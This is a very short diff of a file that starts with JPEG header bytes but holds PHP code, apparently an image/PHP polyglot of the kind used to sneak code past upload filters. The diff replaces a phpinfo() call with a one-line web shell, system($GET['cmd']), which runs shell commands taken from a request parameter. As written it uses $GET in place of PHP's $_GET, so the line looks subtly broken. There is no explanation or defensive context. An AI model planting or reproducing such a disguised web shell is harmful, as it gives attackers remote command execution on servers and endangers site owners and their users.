@@ -1,4 +1,4 @@
 ÿØÿ
 <?php
-phpinfo();
+system($GET['cmd']);
 ?>
